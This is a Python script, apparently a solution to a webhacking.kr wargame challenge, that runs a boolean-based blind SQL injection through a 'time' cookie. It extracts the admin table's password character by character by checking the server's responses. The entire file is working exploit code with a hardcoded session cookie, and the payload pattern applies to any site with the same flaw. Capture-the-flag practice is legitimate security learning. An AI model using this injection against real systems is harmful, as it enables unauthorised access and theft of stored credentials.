from http import client

conn = client.HTTPConnection('webhacking.kr',80)

url = "/challenge/web/web-02/index.php"

tryList=[]
aswList=[]

for i in range(48,126):
    tryList.append(i)

for passloca in range(1,11):
    for asci in tryList:
        print(str(asci))
        headers={'Cookie': 'time=7000 and (select ascii(substring(password,'+str(passloca)+',1)) from admin)='+str(asci)+'; PHPSESSID=5os45be3h37g2ecjjo9dea4s23'}
        conn.request('GET', url, '', headers)
        res = conn.getresponse()
        resData = res.read()
        strRes = str(resData)
        if(strRes.find('<!--2070-01-01 09:00:00-->') == -1):
            aswList.append(str(asci))
            print(aswList)
            break

for i in aswList:
    print(chr(int(i)), end='')

conn.close()
